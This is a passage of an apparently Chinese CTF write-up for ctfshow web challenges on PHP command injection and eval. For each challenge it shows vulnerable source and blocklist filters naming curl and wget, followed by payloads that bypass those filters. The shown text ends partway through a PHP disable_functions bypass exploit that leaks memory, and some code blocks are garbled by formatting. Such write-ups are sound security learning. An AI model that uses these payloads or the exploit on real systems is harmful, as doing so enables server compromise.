返回数组第一个单元的值，如果数组为空则返回false</h1><h1 id="scandir-读取特定目录的数据"><a href="#scandir-读取特定目录的数据" class="headerlink" title="scandir() 读取特定目录的数据"></a>scandir() 读取特定目录的数据</h1><p>  合起来就是打印当前目录<br>  <figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><br>```shell<br>接下来就是想要获取flag.php里面的内容了<br>?c=show<span class="hljs-constructor">_source(<span class="hljs-params">next</span>(<span class="hljs-params">array_reverse</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">reset</span>(<span class="hljs-params">localeconv</span>()</span>)))));<br>#解释：<br>#<span class="hljs-built_in">array</span><span class="hljs-constructor">_reverse()</span> 以相反的元素返回数组<br>#next<span class="hljs-literal">()</span> 将数组中的内部指针向前移动一位，并输出<br>#经过测试，不能循环使用next，next来访问到，也不能先<span class="hljs-keyword">end</span>再prev，只能将数组反过来然后next，就刚好可以得到flag.php的目录<br></code></pre></td></tr></table></figure></p><h3 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h3><ul><li>这题把我干沉默了</li><li>看大佬WP吧</li><li><a href="https://blog.csdn.net/miuzzx/article/details/108569080">https://blog.csdn.net/miuzzx/article/details/108569080</a></li></ul><h3 id="Web42"><a href="#Web42" class="headerlink" title="Web42"></a>Web42</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>  <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-comment">#解释：/dev/null 2&gt;&amp;1</span><br><span class="hljs-comment">#&gt; 代表重定向到哪</span><br><span class="hljs-comment"># /dev/null 空设备文件。所有写入的内容都会丢失，俗称黑洞</span><br><span class="hljs-comment"># 1表示stdout标准输出，系统默认值为1，&gt;/dev/null等同于1&gt;/dev/null</span><br><span class="hljs-comment"># 2表示stderr标准错误</span><br><span class="hljs-comment"># &amp;表示等同于，2&gt;&amp;1表示2的输出定向等同于1</span><br><span class="hljs-comment"># 1&gt;/dev/null 首先表示标准输出重定向到空设备文件也就是丢弃标准输出</span><br><span class="hljs-comment"># 2&gt;&amp;1 标准错误输出重定向等同于标准输出，因为之前标准输出已经被重定向到黑洞，所以也被丢弃</span><br><span class="hljs-comment"># 所以标准输出和标准错误都不会被输出</span><br><span class="hljs-comment"># 所以shell命令不会输出任何信息</span><br></code></pre></td></tr></table></figure><ul><li><pre><code class="shell">/?c=cat%09flag.php;查看源码找到flag#注意 使用了;来截断<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web43</span><br><br>```php<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>  &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><pre><code class="shell">在web42的基础上过滤了;和cat/?c=tac flag.php%0a<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web44</span><br><br>```php<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/;|cat|flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>  &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><pre><code class="hljs">在web43的基础上过滤了flag/?c=tac f*.php%0a<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web45</span><br><br>```php<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>  &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><pre><code class="hljs">在web44的基础上过滤了空格/?c=tac%09f*.php%0a<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web46</span><br><br>```php<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>  &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><p>&#96;&#96;&#96;<br>又多过滤了一个*号<br>&#x2F;?c&#x3D;tac%09????????%0a</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web47~<span class="hljs-number">49</span><br><br>- 同web46<br><br>### web50～<span class="hljs-number">51</span><br><br>- ```<br>  /?c=nl&lt;fla<span class="hljs-string">&#x27;&#x27;</span>g.php||ls<br></code></pre></td></tr></table></figure></li></ul><h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><pre><code class="shell">/?c=nl$&#123;IFS&#125;/fla&#39;&#39;g||<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### Web53</span><br><br>```php<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>.<span class="hljs-variable">$d</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;no&#x27;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><pre><code class="shell">/?c=ca\t$&#123;IFS&#125;fla\g.php%0a#可以用\来拼接<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web54</span><br><br>```php<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><pre><code class="shell">#没想出来查了下wp#uniq()函数 用于去重 长见识了/?c=uniq$&#123;IFS&#125;f???.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web55</span><br><br>```php<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><pre><code class="shell">#过滤了字母🤏#数字没有过滤#使用64来匹配/bin/base64这个命令，它的作用是将指定的文件内容以base64加密的形式输出/?c=/???/????64 ????.???<figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs r"><br><span class="hljs-comment">### web56</span><br><br>```php<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;<br>        system($c);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><pre><code class="shell">#md练数字也过滤？#低头http://t.csdn.cn/BXUrd<figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs r"><br><span class="hljs-comment">### web57</span><br><br>```php<br>// 还能炫的动吗？<br>//flag in 36.php<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;, $c))&#123;<br>        system(&quot;cat &quot;.$c.&quot;.php&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><p>&#96;&#96;&#96;shell<br>基本啥都过滤<br>提示flag在36.php<br>所以要在linux中构造出36<br>但是我炫不动</p><h2 id="认输"><a href="#认输" class="headerlink" title="认输"></a>认输</h2><p>参考大佬WP：</p><h2 id="x2F-c-x3D"><a href="#x2F-c-x3D" class="headerlink" title="&#x2F;?c&#x3D;$(($(($(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))))))"></a>&#x2F;?c&#x3D;$((<del>$(($((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))))))</h2></li></ul><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>  ${<em>}&#x3D;””<br>  $((${</em>}))&#x3D;0<br>  $((~$((${<em>}))))&#x3D;-1<br>  #然后拼接初-36取反<br>  注意的${</em>}会输出上一次执行的结果<br>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web58～65</span><br><br>```php<br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure></p><ul><li>&#96;&#96;&#96;shell<h2 id="题目提示函数-让我想起来web40"><a href="#题目提示函数-让我想起来web40" class="headerlink" title="#题目提示函数 让我想起来web40"></a>#题目提示函数 让我想起来web40</h2>#读取当前目录<br>c&#x3D;print_r(scandir(reset(localeconv())));<br>或者<br>c&#x3D;print_r(glob(“*”));<h2 id="注意这题使用HackBar传POST"><a href="#注意这题使用HackBar传POST" class="headerlink" title="注意这题使用HackBar传POST"></a>注意这题使用HackBar传POST</h2>c&#x3D;show_source(‘flag.php’);<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web66~<span class="hljs-number">67</span><br><br>- c=print_r(scandir(<span class="hljs-string">&quot;/&quot;</span>));<br>- c=highlight_file(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br><br>### web68～<span class="hljs-number">70</span><br><br>- ![在这里插入图片描述](https:<span class="hljs-comment">//img-blog.csdnimg.cn/814986f6418044909f16a4b960528037.png)</span><br><br>- 说明highlight_file()函数被禁用了<br><br>- 尝试发现print_r()也被禁用<br><br>- ```shell<br>  c=var_dump(scandir(<span class="hljs-string">&quot;/&quot;</span>));#打印当前目录<br>  ------------------------------------<br>  c=include(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br>  或<br>  c=require(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br>  #include和require能执行文件中的代码，因为flag不是php代码，所以只能以文本形式显示<br></code></pre></td></tr></table></figure></li></ul><h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<span class="hljs-comment">#此函数返回输出缓冲区的内容</span><br>        <span class="hljs-title function_ invoke__">ob_end_clean</span>();<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-variable">$s</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>其他和上面一样，这次居然把数字字母给我换成❓，不让我看</p></li><li><pre><code class="shell">c=include(&#39;/flag.txt&#39;);exit(0);#截断试一下<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web72</span><br><br>- 很痛苦这一题<br>- 在web71的基础上增加了open_basedir和disable_functions的限制<br>- open_basedir:将PHP所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如<span class="hljs-title function_ invoke__">fopen</span>()或<span class="hljs-title function_ invoke__">file_get_contents</span>()打开一个文件时，这个文件的位置就会被检查。当文件在指定的目录树之外，程序将拒绝打开<br>- disable_functions:用于禁止某些函数，也就是黑名单，简单来说就是php为了防止某些危险函数执行给出的配置项，默认情况下为空<br>- 下面是解法：（参考了多处WP😭，反正还是不懂，菊花已经被🫒了）<br><br>- ```shell<br>  c=<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27; &#x27;</span>);&#125;<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-meta">?&gt;</span><br>  <span class="hljs-comment">#利用脚本找到flag存放在flag0.txt中</span><br>  <span class="hljs-comment">#glob:// 查找匹配的文件路径模式</span><br>  <br></code></pre></td></tr></table></figure></code></pre></li><li><p>&#96;&#96;&#96;php</p></li></ul><h1 id="将下面脚本url编码后发过去"><a href="#将下面脚本url编码后发过去" class="headerlink" title="将下面脚本url编码后发过去"></a>将下面脚本url编码后发过去</h1><p>  c&#x3D;function ctfshow($cmd) {<br>      global $abc, $helper, $backtrace;</p><pre><code class="hljs">  class Vuln &#123;      public $a;      public function __destruct() &#123;           global $backtrace;           unset($this-&gt;a);          $backtrace = (new Exception)-&gt;getTrace();          if(!isset($backtrace[1][&#39;args&#39;])) &#123;              $backtrace = debug_backtrace();          &#125;      &#125;  &#125;  class Helper &#123;      public $a, $b, $c, $d;  &#125;  function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;      $address = 0;      for($j = $s-1; $j &gt;= 0; $j--) &#123;          $address &lt;&lt;= 8;          $address |= ord($str[$p+$j]);      &#125;      return $address;  &#125;  function ptr2str($ptr, $m = 8) &#123;      $out = &quot;&quot;;      for ($i=0; $i &lt; $m; $i++) &#123;          $out .= sprintf(&quot;%c&quot;,($ptr &amp; 0xff));          $ptr &gt;&gt;= 8;      &#125;      return $out;  &#125;  function write(&amp;$str, $p, $v, $n = 8) &#123;      $i = 0;      for($i = 0; $i &lt; $n; $i++) &#123;          $str[$p + $i] = sprintf(&quot;%c&quot;,($v &amp; 0xff));          $v &gt;&gt;= 8;      &#125;  &#125;  function leak($addr, $p = 0, $s = 8) &#123;      global $abc, $helper;      write($abc, 0x68, $addr + $p - 0x10);      $leak = strlen($helper-&gt;a);      if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;      return $leak;  &#125;  function parse_elf($base) &#123;      $e_type = leak($base, 0x10, 2);      $e_phoff = leak($base, 0x20);      $e_phentsize = leak($base, 0x36, 2);      $e_phnum = leak($base, 0x38, 2);      for($i = 0; $i &lt; $e_phnum; $i++) &#123;          $header = $base + $e_phoff + $i * $e_phentsize;          $p_type  = leak($header, 0, 4);          $p_flags = leak($header, 4, 4);          $p_vaddr = leak($header, 0x10);          $p_memsz = leak($header, 0x28);          if($p_type == 1 &amp;&amp; $p_flags == 6) &#123;               $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;              $data_size = $p_memsz;          &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123;               $text_size = $p_memsz;          &#125;      &#125;      if(!$data_addr || !$text_size || !$data_size)          return false;      return [$data_addr, $text_size, $data_size];  &#125;  function get_basic_funcs($base, $elf) &#123;      list($data_addr, $text_size, $data_size) = $elf;      for($i = 0; $i &lt; $data_size / 8; $i++) &#123;          $leak = leak($data_addr, $i * 8);          if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;              $deref = leak($leak);                            if($deref != 0x746e6174736e6f63)                  continue;          &#125; else continue;          $leak = leak($data_addr, ($i + 4) * 8);          if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;              $deref = 